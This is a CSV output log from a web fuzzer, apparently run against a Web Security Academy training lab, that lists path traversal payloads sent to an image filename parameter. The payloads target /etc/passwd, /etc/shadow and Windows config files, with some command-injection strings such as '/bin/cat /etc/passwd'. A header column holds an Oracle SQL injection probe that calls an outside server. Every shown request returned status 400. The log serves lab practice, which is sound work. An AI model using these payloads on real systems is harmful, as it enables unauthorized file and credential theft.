id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,57,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,58,%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,59,%2e%2e%2f%2e%68%74%61%63%63%65%73%73,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,60,%2e%68%74%61%63%63%65%73%73,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,61,%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,62,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,63,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,64,%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,65,%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,66,%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,67,../../../../../../../../../../../../etc/hosts%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/hosts%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,68,../../../../../../../../../../../../etc/hosts,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/hosts,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,69,../../boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,70,/../../../../../../../../%2A,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../%2A,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,71,../../../../../../../../../../../../etc/passwd%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,72,../../../../../../../../../../../../etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,73,../../../../../../../../../../../../etc/shadow%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,74,../../../../../../../../../../../../etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,75,/../../../../../../../../../../etc/passwd^^,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../etc/passwd^^,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,76,/../../../../../../../../../../etc/shadow^^,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../etc/shadow^^,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,77,/../../../../../../../../../../etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,78,/../../../../../../../../../../etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,79,/./././././././././././etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/./././././././././././etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,80,/./././././././././././etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/./././././././././././etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,81,\..\..\..\..\..\..\..\..\..\..\etc\passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,82,\..\..\..\..\..\..\..\..\..\..\etc\shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,83,..\..\..\..\..\..\..\..\..\..\etc\passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,84,..\..\..\..\..\..\..\..\..\..\etc\shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,85,/..\../..\../..\../..\../..\../..\../etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/..\../..\../..\../..\../..\../..\../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,86,/..\../..\../..\../..\../..\../..\../etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/..\../..\../..\../..\../..\../..\../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,87,.\./.\./.\./.\./.\./.\./etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=.\./.\./.\./.\./.\./.\./etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,88,.\./.\./.\./.\./.\./.\./etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=.\./.\./.\./.\./.\./.\./etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,89,\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,90,\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,91,..\..\..\..\..\..\..\..\..\..\etc\passwd%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,92,..\..\..\..\..\..\..\..\..\..\etc\shadow%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..\etc\shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,93,%0a/bin/cat%20/etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%0a/bin/cat%20/etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,94,%0a/bin/cat%20/etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%0a/bin/cat%20/etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,95,%00/etc/passwd%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%00/etc/passwd%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,96,%00/etc/shadow%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%00/etc/shadow%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,97,%00../../../../../../etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%00../../../../../../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,98,%00../../../../../../etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%00../../../../../../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,99,/../../../../../../../../../../../etc/passwd%00.jpg,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../../etc/passwd%00.jpg,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,100,/../../../../../../../../../../../etc/passwd%00.html,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../../etc/passwd%00.html,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,101,/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,102,/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,103,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,104,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,105,%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,106,/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,107,%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,108,/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,109,\&apos;/bin/cat%20/etc/passwd\&apos;,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=\&apos;/bin/cat%20/etc/passwd\&apos;,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,110,\&apos;/bin/cat%20/etc/shadow\&apos;,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=\&apos;/bin/cat%20/etc/shadow\&apos;,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,111,../../../../../../../../conf/server.xml,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../conf/server.xml,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,112,/../../../../../../../../bin/id|,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../bin/id|,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,113,C:/inetpub/wwwroot/global.asa,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=C:/inetpub/wwwroot/global.asa,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,114,C:\inetpub\wwwroot\global.asa,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=C:\inetpub\wwwroot\global.asa,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,115,C:/boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=C:/boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,116,C:oot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=C:oot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,117,../../../../../../../../../../../../localstart.asp%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../localstart.asp%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,118,../../../../../../../../../../../../localstart.asp,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../localstart.asp,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,119,../../../../../../../../../../../../boot.ini%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../boot.ini%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,120,../../../../../../../../../../../../boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=../../../../../../../../../../../../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,121,/./././././././././././boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/./././././././././././boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,122,/../../../../../../../../../../../boot.ini%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,123,/../../../../../../../../../../../boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,124,/..\../..\../..\../..\../..\../..\../boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/..\../..\../..\../..\../..\../..\../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,125,/.\./.\./.\./.\./.\./.\./boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/.\./.\./.\./.\./.\./.\./boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,126,\..\..\..\..\..\..\..\..\..\..oot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=\..\..\..\..\..\..\..\..\..\..oot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,127,..\..\..\..\..\..\..\..\..\..oot.ini%00,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..oot.ini%00,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,128,..\..\..\..\..\..\..\..\..\..oot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=..\..\..\..\..\..\..\..\..\..oot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,129,/../../../../../../../../../../../boot.ini%00.html,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini%00.html,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,130,/../../../../../../../../../../../boot.ini%00.jpg,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/../../../../../../../../../../../boot.ini%00.jpg,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,131,/.../.../.../.../.../,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/.../.../.../.../.../,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,132,..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
id_fuzz_1,133,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,https://ac7b1f7e1e9148c780b285ec0065005c.web-security-academy.net/image?filename=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.246863,14
